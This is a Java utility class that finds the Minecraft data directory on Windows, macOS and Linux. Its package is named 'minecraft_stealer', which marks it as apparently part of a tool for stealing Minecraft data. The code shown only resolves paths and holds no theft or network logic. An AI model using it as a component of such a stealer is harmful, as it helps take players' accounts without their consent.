package org.bitbucket.minecraft_stealer.util;

import java.io.File;

public final class PlatformUtils {
	private static enum OperatingSystem {
		WINDOWS, MAC, SOLARIS, LINUX, UNKNOWN;
		private OperatingSystem() {
		}
	}

	private static final String APPLICATION_NAME = "minecraft";

	public static File minecraftDir() {
		final String userHome = System.getProperty("user.home", ".");
		File workingDir;
		switch (platform().ordinal()) {
		case 0:
			final String applicationData = System.getenv("APPDATA"),
					folder = applicationData != null ? applicationData : userHome;
			workingDir = new File(folder, "." + APPLICATION_NAME + File.separator);
			break;
		case 1:
			workingDir = new File(userHome,
					"Library" + File.separator + "Application Support" + File.separator + APPLICATION_NAME);
			break;
		case 2:
		case 3:
			workingDir = new File(userHome, "." + APPLICATION_NAME + File.separator);
			break;
		default:
			workingDir = new File(userHome, APPLICATION_NAME + File.separator);
		}
		return workingDir;
	}

	private static OperatingSystem platform() {
		final String osName = System.getProperty("os.name").toLowerCase();
		if (osName.contains("win")) {
			return OperatingSystem.WINDOWS;
		}
		if (osName.contains("mac")) {
			return OperatingSystem.MAC;
		}
		if (osName.contains("linux")) {
			return OperatingSystem.LINUX;
		}
		if (osName.contains("unix")) {
			return OperatingSystem.LINUX;
		}
		return OperatingSystem.UNKNOWN;
	}
}
